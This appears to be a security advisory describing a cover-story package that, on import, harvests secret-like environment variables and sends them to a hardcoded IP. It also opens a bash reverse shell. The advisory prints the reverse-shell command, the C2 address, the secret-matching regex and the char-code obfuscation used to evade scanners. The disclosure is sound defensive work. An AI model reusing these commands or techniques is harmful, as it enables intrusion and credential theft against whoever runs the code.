summary: Import-time credential exfiltration and reverse shell to hardcoded C2
details: On require(), lib/index.js executes an obfuscated payload that (1) enumerates process.env, filters keys matching /KEY|SECR|TOK|PASS|PRIV|MNEM|AWS|FIRE|DB_|PG|SIGN|VAULT/i, and POSTs the matched values together with hostname, username, and cwd to http://2.25.186.116:8443/t; and (2) spawns `/bin/sh -c "bash -i >& /dev/tcp/2.25.186.116/4444 0>&1 &"`, establishing an interactive reverse shell to the same IP. Module names ('http','os','child_process'), the destination IP (encoded as char-code array [50,46,50,53,46,49,56,54,46,49,49,54] → '2.25.186.116'), and the bash reverse-shell command are all stored as numeric arrays and reconstructed via String.fromCharCode at runtime to evade scanners. The package's advertised purpose ('Shared UI constants and utilities for Variational protocol frontend applications') has no relationship to the shipped payload — this is a cover-story package built to harvest secrets and gain shell access from anyone who installs or imports it.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
